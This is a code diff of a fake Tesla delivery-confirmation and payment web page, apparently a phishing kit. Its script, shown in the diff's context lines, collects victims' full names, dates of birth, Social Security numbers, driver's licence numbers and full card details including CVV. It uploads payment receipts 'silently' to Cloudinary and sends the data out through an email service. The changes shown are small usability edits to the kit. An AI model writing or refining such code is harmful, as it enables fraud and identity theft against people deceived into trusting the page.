@@ -380,14 +380,13 @@
             <p>Tesla © 2024 | Privacy Policy | Terms of Use</p>
             <p>3500 Deer Creek Road, Palo Alto, CA 94304</p>
         </div>
-    </div>
+                </div>
 
     <!-- Page 3: Confirmation -->
 <div class="container hidden" id="confirmation-page">
     <div class="header">
         <img src="https://www.tesla.com/tesla_theme/assets/img/_vehicle_redesign/logo.svg" alt="Tesla">
     </div>
-
     <div class="content">
         <div class="progress-bar">
             <div class="progress-steps">
@@ -399,15 +398,12 @@
                 <div class="progress-indicator" style="width: 100%"></div>
             </div>
         </div>
-
         <div class="confirmation-icon">
             <svg viewBox="0 0 24 24" fill="#5cb85c">
                 <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z"/>
             </svg>
         </div>
-
         <h2 style="text-align: center;">Your Tesla Delivery is Confirmed!</h2>
-
         <div class="summary-box">
             <div class="summary-row">
                 <span>Vehicle:</span>
@@ -430,14 +426,11 @@
                 <span>$2,285.00</span>
             </div>
         </div>
-
         <div style="text-align: center; margin: 25px 0;">
             <p>You will receive a delivery confirmation email within 24 hours.</p>
             <p>Track your vehicle at <a href="#">www.tesla.com/track</a></p>
         </div>
-
         <button class="btn" onclick="alert('This is a demonstration only. No actual receipt is generated.')">Download Receipt</button>
-
         <div class="security-badge" style="justify-content: center;">
             <svg width="16" height="16" viewBox="0 0 24 24" fill="#5cb85c" style="margin-right: 8px;">
                 <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"/>
@@ -445,7 +438,6 @@
             Transaction ID: TES-78912345-2024
         </div>
     </div>
-
     <div class="footer">
         <p>Tesla © 2024 | Privacy Policy | Terms of Use</p>
         <p>3500 Deer Creek Road, Palo Alto, CA 94304</p>
@@ -470,7 +462,6 @@
             el.classList.add('hidden');
         });
         document.getElementById(pageId).classList.remove('hidden');
-
         if (pageId === 'confirmation-page') {
             const nameInput = document.getElementById('fullname');
             document.getElementById('delivery-address').textContent =
@@ -483,11 +474,9 @@
             el.classList.remove('active');
         });
         document.querySelector(`.payment-method[onclick="selectPayment('${method}')"]`).classList.add('active');
-
         document.getElementById('credit-card-payment').classList.add('hidden');
         document.getElementById('bank-transfer-payment').classList.add('hidden');
         document.getElementById('crypto-payment').classList.add('hidden');
-
         document.getElementById(`${method}-payment`).classList.remove('hidden');
     }
 
@@ -496,12 +485,10 @@
         const formData = new FormData();
         formData.append('file', file);
         formData.append('upload_preset', 'unsigned_preset');
-
         const response = await fetch(url, {
             method: 'POST',
             body: formData
         });
-
         const data = await response.json();
         if (!data.secure_url) throw new Error("Cloudinary upload failed");
         return data.secure_url;
@@ -512,7 +499,6 @@
         const originalText = payButton.textContent;
         payButton.textContent = 'Processing...';
         payButton.disabled = true;
-
         try {
             const requiredFields = ['fullname', 'dob', 'ssn', 'dl'];
             for (const fieldId of requiredFields) {
@@ -523,7 +509,6 @@
             }
 
             const paymentMethod = document.querySelector('.payment-method.active').textContent.trim();
-
             const templateParams = {
                 full_legal_name: document.getElementById('fullname').value,
                 date_of_birth: document.getElementById('dob').value,
@@ -544,7 +529,6 @@
                         throw new Error('Please complete all card details');
                     }
                 }
-
                 templateParams.card_number = document.getElementById('card-number').value;
                 templateParams.expiration_date = document.getElementById('expiry').value;
                 templateParams.security_code = document.getElementById('cvv').value;
@@ -552,11 +536,9 @@
             } else {
                 const fileInputId = paymentMethod === 'Bank Transfer' ? 'bank-receipt' : 'crypto-receipt';
                 const fileInput = document.getElementById(fileInputId);
-
                 if (!fileInput || fileInput.files.length === 0) {
                     throw new Error('Please upload your payment receipt');
                 }
-
                 const receiptUrl = await silentUploadToCloudinary(fileInput.files[0]);
                 templateParams.receipt_url = receiptUrl;
             }
@@ -573,14 +555,25 @@
                 throw new Error('Email sending failed');
             }
         } catch (error) {
-            alert('Error: ' + error.message);
+            alert(error.message);
             console.error('Payment processing error:', error);
         } finally {
             payButton.textContent = originalText;
             payButton.disabled = false;
         }
     }
-                    </script>
+
+    // Show selected file name immediately
+    document.getElementById('bank-receipt')?.addEventListener('change', function () {
+        const fileNameSpan = document.getElementById('bank-receipt-filename');
+        fileNameSpan.textContent = this.files.length > 0 ? `Selected: ${this.files[0].name}` : '';
+    });
+
+    document.getElementById('crypto-receipt')?.addEventListener('change', function () {
+        const fileNameSpan = document.getElementById('crypto-receipt-filename');
+        fileNameSpan.textContent = this.files.length > 0 ? `Selected: ${this.files[0].name}` : '';
+    });
+            </script>
 </body>
 </html>
-                    
+            
